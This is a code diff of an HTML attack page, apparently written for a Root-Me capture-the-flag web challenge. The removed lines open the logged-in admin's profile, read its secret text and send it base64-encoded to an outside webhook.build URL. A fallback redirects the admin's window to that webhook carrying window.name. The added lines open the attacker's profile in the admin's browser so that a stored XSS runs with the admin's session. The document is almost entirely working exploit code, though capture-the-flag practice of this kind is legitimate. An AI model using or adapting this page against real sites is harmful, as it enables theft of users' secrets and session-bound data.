@@ -2,23 +2,10 @@
 <html>
 <body>
     <script>
-        // 1. Open the admin's profile
-        const adminWindow = window.open('http://challenge01.root-me.org:58003/profile');
-
-        // 2. Wait for it to load, then grab the content
-        // Note: This only works if there isn't a strict Cross-Origin-Opener-Policy
-        setTimeout(() => {
-            try {
-                // Try to grab the secret directly from the admin's window
-                const secret = adminWindow.document.body.innerText;
-                fetch('https://webhook.build/api/webhook/1ebfbe39-d596-4e8c-b261-3b05cbfe9b45?data=' + btoa(secret));
-            } catch (e) {
-                // If direct access is blocked, we use the "opener" back-channel
-                // by redirecting the admin's window to your webhook
-                adminWindow.location = 'https://webhook.build/api/webhook/1ebfbe39-d596-4e8c-b261-3b05cbfe9b45?data=' + btoa(adminWindow.name);
-            }
-        }, 2000);
+        // This opens YOUR profile in the admin's browser
+        // Since the admin is logged in, they see THEIR secret + YOUR XSS
+        window.open('http://challenge01.root-me.org:58003/profile', 'victim');
     </script>
-    <h1>Processing Secret...</h1>
+    <h1>Redirecting to Secure Vault...</h1>
 </body>
 </html>
